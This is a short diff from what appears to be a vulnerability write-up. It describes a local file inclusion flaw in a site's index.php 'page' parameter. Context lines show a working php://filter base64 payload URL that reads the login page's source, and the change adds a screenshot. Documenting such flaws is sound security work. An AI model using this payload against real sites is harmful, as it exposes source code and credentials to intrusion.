@@ -22,3 +22,4 @@ In the site's index.php page, due to insufficient filtering of the page paramete
 ```
 http://192.168.17.22/index.php?page=php://filter/convert.base64-encode/resource=login
 ```
+<img width="1536" alt="image" src="https://github.com/user-attachments/assets/21c3f42a-2b42-431d-9bbc-c09002edbd27">
